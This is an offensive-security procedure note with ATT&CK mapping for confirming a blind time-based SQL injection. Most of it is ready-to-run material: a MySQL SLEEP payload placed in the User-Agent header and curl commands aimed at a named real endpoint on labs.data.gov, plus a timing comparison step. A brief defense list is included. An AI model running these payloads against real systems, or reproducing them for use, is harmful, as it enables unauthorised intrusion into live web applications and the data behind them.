---
id: proc-no-delay
tags:
  - sqli
  - blind-sqli
  - time-based
  - mysql
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-no-delay]]'
  - '[[commands/sql-payload-no-sleep]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:10.346Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm-SQLi-with-No-Delay

## Summary

This procedure sends a variant SQL injection payload in the User-Agent header that evaluates to zero sleep time (5*5*0=0), resulting in an immediate response to contrast with delaying payloads and confirm that observed delays are due to successful SQL execution rather than external factors.

## Description

Building on the injection point identified, this test uses the same endpoint and header but modifies the arithmetic in the SLEEP function to zero, ensuring the conditional logic executes without pausing the server. This differential analysis is key in blind SQLi verification, ruling out false positives from network latency in the labs.data.gov application.

## Requirements

1. Successful completion of a delaying payload test
2. curl or equivalent HTTP client
3. Baseline timing knowledge from normal requests
4. Understanding of MySQL arithmetic in expressions

## Defense

Defensive measures and detection strategies:

- Parameterize all dynamic SQL inputs, including headers
- Implement rate limiting on requests with suspicious timing patterns
- Use intrusion detection systems to flag requests with SQL functions in headers
- Regularly audit query logs for SLEEP or conditional executions

## Objectives

1. Validate non-delaying injection to baseline normal response times
2. Confirm SQL logic evaluation without side effects
3. Support differential proof for time-based exploitation

## Instructions

### Step 1: Inject Zero-Delay Payload

**Context**: Append the no-sleep payload to a standard User-Agent string to test SQL incorporation without delay.

**Command** ([[commands/sql-payload-no-sleep]]):
```sql
XOR(if(now()=sysdate(),sleep(5*5*0),0))OR
```

> Evaluates SLEEP(0), causing no pause while confirming injection.

**Command** ([[commands/curl-inject-no-delay]]):
```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'" -H "Referer: 1" -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" -H "Accept-Encoding: gzip,deflate" -H "Accept: */*" https://labs.data.gov/dashboard/datagov/csv_to_json
```

> Expect instant response if the payload is processed as SQL.

### Step 2: Compare Response Times

**Context**: Measure and compare against delaying tests to ensure consistency.

**Command** (timed curl):
```bash
curl -w "%{time_total}s" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'" -H "Referer: 1" https://labs.data.gov/dashboard/datagov/csv_to_json
```

> Total time should be <1 second, confirming no artificial delay.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

-

## Commands Used

- [[commands/curl-inject-no-delay]]
- [[commands/sql-payload-no-sleep]]

## Tools Used

-

## Tags

- sqli
- blind-sqli
- time-based
- mysql
